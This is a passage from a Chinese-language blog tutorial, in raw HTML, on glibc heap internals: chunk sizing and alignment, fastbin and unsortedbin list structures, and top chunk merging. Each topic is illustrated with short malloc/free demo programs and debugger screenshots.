class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;unistd.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;malloc.h&gt;</span></span></span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> <span class=\"built_in\">size</span>=<span class=\"number\">0x108</span>;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">void</span> *p1=<span class=\"built_in\">malloc</span>(<span class=\"built_in\">size</span>);</span><br><span class=\"line\">    sleep(<span class=\"number\">0</span>);  <span class=\"comment\">//只为了打断点使用，无其他用处</span></span><br><span class=\"line\"> </span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"built_in\">free</span>(p1);    </span><br><span class=\"line\">  </span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>0x108模0x10之后还有8 说明是占用了下一个chunk的pre_size</p>\n<p>64位16字节对齐 0x100(分配)+0x10(头)+0x1(P)</p>\n</blockquote>\n<p><img src=\"/2020/12/15/%E5%A0%86/image-20201214190713309.png\" alt=\"image-20201214190713309\"></p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;unistd.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;malloc.h&gt;</span></span></span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> <span class=\"built_in\">size</span>=<span class=\"number\">0x109</span>;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">void</span> *p1=<span class=\"built_in\">malloc</span>(<span class=\"built_in\">size</span>);</span><br><span class=\"line\">    sleep(<span class=\"number\">0</span>);  <span class=\"comment\">//只为了打断点使用，无其他用处</span></span><br><span class=\"line\"> </span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"built_in\">free</span>(p1);    </span><br><span class=\"line\">  </span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>0x109模0x10为9 所以pre_size不够用 需要多申请1个单元</p>\n<p>chunk被隐式对齐位0x110</p>\n<p>64位16字节对齐 0x110+0x10+0x1</p>\n</blockquote>\n<p><img src=\"/2020/12/15/%E5%A0%86/image-20201214191149578.png\" alt=\"image-20201214191149578\"></p>\n<h3 id=\"0x09-chunk的大小\"><a href=\"#0x09-chunk的大小\" class=\"headerlink\" title=\"0x09 chunk的大小\"></a>0x09 chunk的大小</h3><p>其实上一节我们就演示了 但这一节还是重点讲一下</p>\n<h4 id=\"1-chunk的实际大小\"><a href=\"#1-chunk的实际大小\" class=\"headerlink\" title=\"1.chunk的实际大小\"></a>1.chunk的实际大小</h4><ul>\n<li>当用户通过malloc函数申请堆内存时，可以使用的内存的起始地址是从fd成员开始的，所以用户无法访问结构体的前两个成员</li>\n<li>当用户申请size大小的堆块时，在glibc中本质上是申请了size+16大小（64位系统中）的内存，因为要加上前两个成员</li>\n<li>例如：malloc(0x10);申请了0x10大小的堆内存，本质上在glibc中申请了0x10+0x10=0x20大小的空间</li>\n<li><strong>chunk的实际大小=malloc的大小+chunk的前两个成员+mchunk_prev_size成员的合并操作+chunk对齐规则</strong></li>\n</ul>\n<p>这个上面演示过了 就不演示了</p>\n<h4 id=\"2-chunk的最低大小\"><a href=\"#2-chunk的最低大小\" class=\"headerlink\" title=\"2.chunk的最低大小\"></a>2.chunk的最低大小</h4><ul>\n<li>malloc的堆块大小在glibc中会加上前两个成员的大小（0x10大小），所以当你分配一个堆内存时，堆内存的最小大小一定为0x20（0x10+0x10）。（即使malloc没有指定大小，也要分配fd和bk成员，所以加起来就是malloc_chunk结构体的前4个成员的大小总和）</li>\n<li><strong>chunk的最低大小一定为0x20大小</strong></li>\n</ul>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;unistd.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;malloc.h&gt;</span></span></span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"comment\">//int size=0x109;</span></span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">void</span> *p1=<span class=\"built_in\">malloc</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\">    sleep(<span class=\"number\">0</span>);  <span class=\"comment\">//只为了打断点使用，无其他用处</span></span><br><span class=\"line\"> </span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"built_in\">free</span>(p1);    </span><br><span class=\"line\">  </span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><img src=\"/2020/12/15/%E5%A0%86/image-20201214191901328.png\" alt=\"image-20201214191901328\"></p>\n<p><img src=\"/2020/12/15/%E5%A0%86/image-20201214191928725.png\" alt=\"image-20201214191928725\"></p>\n<h3 id=\"0x10-bins的单向链表、双向链表存储结构\"><a href=\"#0x10-bins的单向链表、双向链表存储结构\" class=\"headerlink\" title=\"0x10 bins的单向链表、双向链表存储结构\"></a>0x10 bins的单向链表、双向链表存储结构</h3><h4 id=\"1-fastbins的单向链表存储结构\"><a href=\"#1-fastbins的单向链表存储结构\" class=\"headerlink\" title=\"1.fastbins的单向链表存储结构\"></a>1.fastbins的单向链表存储结构</h4><ul>\n<li>fastbins是单向链表存储，fastbins中的的chunk是不会合并的（glibc规定这些chunk的PREV_INUSE位永远为1）</li>\n</ul>\n<blockquote>\n<p><strong>存储结构：</strong></p>\n<ul>\n<li><strong>fastbins的存储采用后进先出（LIFO）的原则：</strong>后free的chunk会被添加到先free的chunk的后面；同理，通过malloc取出chunk时是先去取最新放进去的</li>\n<li>因为是单链表，fastbins中的所有chunk的bk是没有用到的</li>\n<li>并且fastbins比较特殊，一个fastbin链第一个chunk指向于一个特殊的“0”，然后后面接的是后free的chunk……以此类推，最后一个chunk再由arena的malloc_state的fastbinsY数组所管理</li>\n</ul>\n<p><img src=\"/2020/12/15/%E5%A0%86/image-20201215160058074.png\" alt=\"image-20201215160058074\"></p>\n</blockquote>\n<p><strong>演示</strong></p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;unistd.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdlib.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;malloc.h&gt;</span></span></span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> <span class=\"built_in\">size</span>=<span class=\"number\">0x10</span>;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> size2=<span class=\"number\">0x20</span>;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> *p1=<span class=\"built_in\">malloc</span>(<span class=\"built_in\">size</span>);</span><br><span class=\"line\">    <span class=\"keyword\">int</span> *p2=<span class=\"built_in\">malloc</span>(<span class=\"built_in\">size</span>);</span><br><span class=\"line\">    <span class=\"keyword\">int</span> *p3=<span class=\"built_in\">malloc</span>(size2);</span><br><span class=\"line\"> </span><br><span class=\"line\">    sleep(<span class=\"number\">0</span>);  <span class=\"comment\">//只为了程序打断点，没有其他作用</span></span><br><span class=\"line\">    <span class=\"built_in\">free</span>(p1);</span><br><span class=\"line\">    <span class=\"built_in\">free</span>(p2);</span><br><span class=\"line\">    <span class=\"built_in\">free</span>(p3);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>打到断点处 heap的信息</p>\n<p><img src=\"/2020/12/15/%E5%A0%86/image-20201215160443811.png\" alt=\"image-20201215160443811\"></p>\n<p>释放p1 p2</p>\n<p><img src=\"/2020/12/15/%E5%A0%86/image-20201215160534048.png\" alt=\"image-20201215160534048\"></p>\n<p>可以看到第一个被释放chunk的fd指针指向0 而第二个被释放chunk的fd指针指向第一个</p>\n<p>看一下main_arena 可以看到是指向最后一个chunk 也就验证了上面的结论</p>\n<p><img src=\"/2020/12/15/%E5%A0%86/image-20201215160746395.png\" alt=\"image-20201215160746395\"></p>\n<p>接下来我们释放第三个</p>\n<p><img src=\"/2020/12/15/%E5%A0%86/image-20201215161151487.png\" alt=\"image-20201215161151487\"></p>\n<p><img src=\"/2020/12/15/%E5%A0%86/image-20201215161023500.png\" alt=\"image-20201215161023500\"></p>\n<p>由于与前两个大小不同所以我们会新开一个链表 说明main_arena的地址也不一样</p>\n<p><img src=\"/2020/12/15/%E5%A0%86/image-20201215161240081.png\" alt=\"image-20201215161240081\"></p>\n<p>此次演示也就完成了</p>\n<p>32位可自行演示</p>\n</blockquote>\n<h4 id=\"2-unsortedbin的双向链表存储结构\"><a href=\"#2-unsortedbin的双向链表存储结构\" class=\"headerlink\" title=\"2.unsortedbin的双向链表存储结构\"></a>2.unsortedbin的双向链表存储结构</h4><ul>\n<li>free的chunk大小如果大于0x80会放到unsortedbin上</li>\n<li>unsortedbin存储这些chunk是使用双向循环链表进行存储的（<strong>smallbins、largebins也是如此，此处只介绍unsortedbin</strong>）</li>\n</ul>\n<blockquote>\n<p><strong>存储结构</strong>：</p>\n<ul>\n<li><strong>存储循环先入先出（FIFO）原则：</strong>上面的是先free掉的chunk，下面是后free掉的chunk；同理，通过malloc取出chunk时是先取上面的，再取下面的</li>\n<li><strong>一个bins中只有一个freechunk时：</strong>就是下面这种表示形式。可以看到freechunk的fd和bk都指向于bins的fd，所以我们使用gdb调试时可以用命令看到，当bin链中只有一个freechunk时，其fd和bk都是相同的，都指向于bins的fd</li>\n</ul>\n<p><img src=\"/2020/12/15/%E5%A0%86/20190729213257204.png\" alt=\"img\"></p>\n<ul>\n<li><strong>一个bins中有多个freechunk时：</strong>上面使我们的struct malloc_state结构体，结构体中的bins数组存储的就是这些bin链，下面就是bins数组中存储unsortedbin的位置，这个数组元素存储的其实就是一个fd和一个bk指针。下面第一个就是第一个free掉的chunk，再下面一个就是第二个free掉的chunk……以此类推</li>\n</ul>\n<p><img src=\"/2020/12/15/%E5%A0%86/20190729212907497.png\" alt=\"img\"></p>\n</blockquote>\n<p><strong>演示</strong></p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;unistd.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdlib.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;malloc.h&gt;</span></span></span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> <span class=\"built_in\">size</span>=<span class=\"number\">0x100</span>;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> *p1=<span class=\"built_in\">malloc</span>(<span class=\"built_in\">size</span>);</span><br><span class=\"line\">    <span class=\"keyword\">int</span> *temp=<span class=\"built_in\">malloc</span>(<span class=\"built_in\">size</span>); <span class=\"comment\">//防止p1与p2合并</span></span><br><span class=\"line\">    <span class=\"keyword\">int</span> *p2=<span class=\"built_in\">malloc</span>(<span class=\"built_in\">size</span>);   </span><br><span class=\"line\">    <span class=\"keyword\">int</span> *p3=<span class=\"built_in\">malloc</span>(<span class=\"built_in\">size</span>);   <span class=\"comment\">//防止p2被top chunk合并</span></span><br><span class=\"line\"> </span><br><span class=\"line\">    sleep(<span class=\"number\">0</span>);</span><br><span class=\"line\">    <span class=\"built_in\">free</span>(p1);</span><br><span class=\"line\">    <span class=\"built_in\">free</span>(p2);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>打断点</p>\n<p><img src=\"/2020/12/15/%E5%A0%86/image-20201215163335296.png\" alt=\"image-20201215163335296\"></p>\n<p>释放p1</p>\n<p><img src=\"/2020/12/15/%E5%A0%86/image-20201215163518823.png\" alt=\"image-20201215163518823\"></p>\n<p>从上面我们也可以看到下一个chunk的标志p位为0了</p>\n<p>看下main_arena</p>\n<p><img src=\"/2020/12/15/%E5%A0%86/image-20201215163755383.png\" alt=\"image-20201215163755383\"></p>\n<p>释放p2</p>\n<p><img src=\"/2020/12/15/%E5%A0%86/image-20201215164417439.png\" alt=\"image-20201215164417439\"></p>\n<p>可以看到main_arena是变了的</p>\n<p><img src=\"/2020/12/15/%E5%A0%86/image-20201215165029835.png\" alt=\"image-20201215165029835\"></p>\n<p>bins头中fd-&gt;p2 bk-&gt;p1</p>\n<p><img src=\"/2020/12/15/%E5%A0%86/image-20201215170240262.png\" alt=\"image-20201215170240262\"> </p>\n<p>演示完成</p>\n</blockquote>\n<h3 id=\"0x11-top-chunk的向前合并\"><a href=\"#0x11-top-chunk的向前合并\" class=\"headerlink\" title=\"0x11 top chunk的向前合并\"></a>0x11 top chunk的向前合并</h3><h4 id=\"1-top-chunk概念\"><a href=\"#1-top-chunk概念\" class=\"headerlink\" title=\"1.top chunk概念\"></a>1.top chunk概念</h4><ul>\n<li>当我们分配一块堆内存时，top chunk是出于地址的最高处的，其前面就是我们所申请的chunk</li>\n</ul>\n<h4 id=\"2-top-chunk的合并操作\"><a href=\"#2-top-chunk的合并操作\" class=\"headerlink\" title=\"2.top chunk的合并操作\"></a>2.top chunk的合并操作</h4><ul>\n<li>如果top chunk前面的chunk不是fast chunk并且处于空闲，那么top chunk就会合并这个chunk</li>\n<li>如果top chunk前面的chunk是fast chunk，不论是否空闲，top chunk都不会合并这个chunk</li>\n</ul>\n<h4 id=\"3-演示-1\"><a href=\"#3-演示-1\" class=\"headerlink\" title=\"3.演示\"></a>3.演示</h4><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;unistd.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;malloc.h&gt;</span></span></span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> <span class=\"built_in\">size</span>=<span class=\"number\">0x20</span>;</span><br><span class=\"line\">    <span class=\"keyword\">void</span> *p1=<span class=\"built_in\">malloc</span>(<span class=\"built_in\">size</span>);</span><br><span class=\"line\">    <span class=\"keyword\">void</span> *p2=<span class=\"built_in\">malloc</span>(<span class=\"built_in\">size</span>);</span><br><span class=\"line\">    </span><br><span class=\"line\">    sleep(<span class=\"number\">0</span>); <span class=\"comment\">//只为了程序打断点，无其他作用</span></span><br><span class=\"line\">    <span class=\"built_in\">free</span>(p2);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>断点 堆信息</p>\n<p><img src=\"/2020/12/15/%E5%A0%86/image-20201215194907019.png\" alt=\"image-20201215194907019\"></p>\n<p>释放p2 可以看到p2是fastbins 未被合并</p>\n<p><img src=\"/2020/12/15/%E5%A0%86/image-20201215194956787.png\" alt=\"image-20201215194956787\"></p>\n</blockquote>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;unistd.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;malloc.h&gt;</span></span></span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> <span class=\"built_in\">size</span>=<span class=\"number\">0x20</span>;</span><br><span class=\"line\">    <span class=\"keyword\">void</span> *p1=<span class=\"built_in\">malloc</span>(<span class=\"built_in\">size</span>);</span><br><span class=\"line\">    <span class=\"keyword\">void</span> *p2=<span class=\"built_in\">malloc</span>(<span class=\"number\">0x100</span>);</span><br><span class=\"line\">    </span><br><span class=\"line\">    sleep(<span class=\"number\">0</span>); <span class=\"comment\">//只为了程序打断点，无其他作用</span></span><br><span class=\"line\">    <span class=\"built_in\">free</span>(p2);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>断点</p>\n<p><img src=\"/2020/12/15/%E5%A0%86/image-20201215195122071.png\" alt=\"image-20201215195122071\"></p>\n<p>释放p2 可以看到p2被合并了</p>\n<p><img src=\"/2020/12/15/%E5%A0%86/image-20201215195147425.png\" alt=\"image-20201215195147425\"></p>\n</blockquote>\n<h4 id=\"4-如何防止top-chunk的合并\"><a href=\"#4-如何防止top-chunk的合并\" class=\"headerlink\" title=\"4.如何防止top chunk的合并\"></a>4.如何防止top chunk的合并</h4><ul>\n<li>只需要在free掉的chunk后面继续申请一个chunk，这样top chunk就不会合并之前的chunk</li>\n</ul>\n<h3 id=\"0x12-chunk的malloc、free\"><a href=\"#0x12-chunk的malloc、free\" class=\"headerlink\" title=\"0x12 chunk的malloc、free\"></a>0x12 chunk的malloc、free</h3><h4 id=\"1-malloc的机制\"><a href=\"#1-malloc的机制\" class=\"headerlink\" title=\"1.malloc的机制\"></a>1.malloc的机制</h4><ul>\n<li><strong>如果程序是第一次malloc：</strong>会创建一个很大的“top chunk”</li>\n<li><strong>如果程序是第二次及之后malloc：</strong>会去先向bins链表寻找空间，如果没有再去向“top chunk”要空间；如果“top chunk”使用完了再通过glibc重新申请一块新的“top chunk”</li>\n</ul>\n<h4 id=\"2-演示\"><a href=\"#2-演示\" class=\"headerlink\" title=\"2.演示\"></a>2.演示</h4><p>上面我们已经演示过很多回了 第一次就不演示了 这里主要来看一下第二次的malloc</p>\n<p>这里是拿fastbin的例子</p>\n<h5 id=\"恰好分割一整块的free-chunk（fastbin）\"><a href=\"#恰好分割一整块的free-chunk（fastbin）\" class=\"headerlink\" title=\"恰好分割一整块的free chunk（fastbin）\"></a><strong>恰好分割一整块的free chunk（fastbin）</strong></h5><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;unistd.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;malloc.h&gt;</span></span></span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> <span class=\"built_in\">size</span>=<span class=\"number\">0x20</span>;</span><br><span class=\"line\">    <span class=\"keyword\">void</span> *p1=<span class=\"built_in\">malloc</span>(<span class=\"built_in\">size</span>);</span><br><span class=\"line\">    sleep(<span class=\"number\">0</span>); <span class=\"comment\">//只为了程序打断点，无其他作用</span></span><br><span class=\"line\">    <span class=\"built_in\">free</span>(p1);</span><br><span class=\"line\">    <span class=\"keyword\">void</span> *p2=<span class=\"built_in\">malloc</span>(<span class=\"number\">0x20</span>);</span><br><span class=\"line\">    </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>直接看free掉p1之后可以看到是进入fastbin了</p>\n<p><img src=\"/2020/12/15/%E5%A0%86/image-20201215200256907.png\" alt=\"image-20201215200256907\"></p>\n<p><img src=\"/2020/12/15/%E5%A0%86/image-20201215200306820.png\" alt=\"image-20201215200306820\"></p>\n<p>我们在来申请p2 可以看见是直接覆盖了p1</p>\n<p><img src=\"/2020/12/15/%E5%A0%86/image-20201215200355918.png\" alt=\"image-20201215200355918\"></p>\n</blockquote>\n<h5 id=\"切割一块chunk（fastbin）\"><a href=\"#切割一块chunk（fastbin）\" class=\"headerlink\" title=\"切割一块chunk（fastbin）\"></a><strong>切割一块chunk（fastbin）</strong></h5><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;unistd.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;malloc.h&gt;</span></span></span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> <span class=\"built_in\">size</span>=<span class=\"number\">0x20</span>;</span><br><span class=\"line\">    <span class=\"keyword\">void</span> *p1=<span class=\"built_in\">malloc</span>(<span class=\"built_in\">size</span>);    sleep(<span class=\"number\">0</span>); <span class=\"comment\">//只为了程序打断点，无其他作用</span></span><br><span class=\"line\">    <span class=\"built_in\">free</span>(p1);</span><br><span class=\"line\">    <span class=\"keyword\">void</span> *p2=<span class=\"built_in\">malloc</span>(<span class=\"number\">0x10</span>);</span><br><span class=\"line\">    </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>我们直接看p2分配之后把</p>\n<p><img src=\"/2020/12/15/%E5%A0%86/image-20201215200826010.png\" alt=\"image-20201215200826010\"></p>\n<p>这里可以看出它并未用fastbin的chunk 而是从top chunk切割了一部分</p>\n</blockquote>\n<h5 id=\"恰好分割一整块的free-chunk（unsorted-bin）\"><a href=\"#恰好分割一整块的free-chunk（unsorted-bin）\" class=\"headerlink\" title=\"恰好分割一整块的free chunk（unsorted bin）\"></a><strong>恰好分割一整块的free chunk（unsorted bin）</strong></h5><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;unistd.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;malloc.h&gt;</span></span></span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> <span class=\"built_in\">size</span>=<span class=\"number\">0x200</span>;</span><br><span class=\"line\">    <span class=\"keyword\">void</span> *p=<span class=\"built_in\">malloc</span>(<span class=\"built_in\">size</span>);</span><br><span class=\"line\">    <span class=\"keyword\">void</span> *p2=<span class=\"built_in\">malloc</span>(<span class=\"built_in\">size</span>); <span class=\"comment\">//为了达到演示效果，防止p被top chunk合并</span></span><br><span class=\"line\"> </span><br><span class=\"line\">    sleep(<span class=\"number\">0</span>);  <span class=\"comment\">//只为了打断点使用</span></span><br><span class=\"line\">    <span class=\"built_in\">free</span>(p);</span><br><span class=\"line\">    </span><br><span 